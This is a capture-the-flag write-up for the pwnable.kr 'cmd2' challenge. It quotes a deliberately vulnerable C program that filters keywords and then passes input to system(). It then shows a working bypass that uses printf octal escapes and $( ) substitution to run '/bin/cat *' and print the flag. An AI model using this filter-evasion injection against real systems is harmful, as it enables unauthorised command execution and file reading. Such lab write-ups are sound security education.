# cmd2

## Description

cmd2 - 9 pt

> Daddy bought me a system command shell. <br>
> but he put some filters to prevent me from playing with it without his permission... <br>
> but I wanna play anytime I want! <br> <br>
> ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)

## Solution

### Background

#### Builtin commands

Builtin commands are commands that are built into the shell itself. They are not executed as separate processes, but are executed by the shell. They are usually faster than external commands, since they don't need to be forked and executed. Also, they can be accessed anytime, even if the `PATH` variable is empty.

### Exploit

We are given the following source code:

```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
	int r=0;
	r += strstr(cmd, "=")!=0;
	r += strstr(cmd, "PATH")!=0;
	r += strstr(cmd, "export")!=0;
	r += strstr(cmd, "/")!=0;
	r += strstr(cmd, "`")!=0;
	r += strstr(cmd, "flag")!=0;
	return r;
}

extern char** environ;
void delete_env(){
	char** p;
	for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
}

int main(int argc, char* argv[], char** envp){
	delete_env();
	putenv("PATH=/no_command_execution_until_you_become_a_hacker");
	if(filter(argv[1])) return 0;
	printf("%s\n", argv[1]);
	system( argv[1] );
	return 0;
}
```

In a similar manner to the first challenge, the program first deletes all the environment variables, and sets `PATH` to `/no_command_execution_until_you_become_a_hacker`. Then, it executes the command that is passed as an argument. However, the program checks if the command contains `=`, `PATH`, `export`, ``` ` ``` or `flag`. If it does, it returns.

Once again our goal is to print the flag. Last time, we managed to bypass the filter by `cat`ing everything inside the directory. This time, calling `/bin/cat` would be harder, since we can't use `/`.

A good direction to go is looking up all the `builtin` commands. We can do this by running `help` in the shell. One command that catches the eye is `printf`. This command is used to print formatted output - similarly to `printf` in C. We can use it to call `/bin/cat` without the need to use `/`:

```sh
$ printf "%bbin%bcat *" "\57" "\57"
/bin/cat *
```

In order to make the shell run the output of the printf, we need to pass it into `cmd2` as an argument. We can do this by using the `$( )` syntax:

```bash
$ ./cmd2 '$(printf "%bbin%bcat *" "\57" "\57")'
FuN_w1th_5h3ll_v4riabl3s_haha
```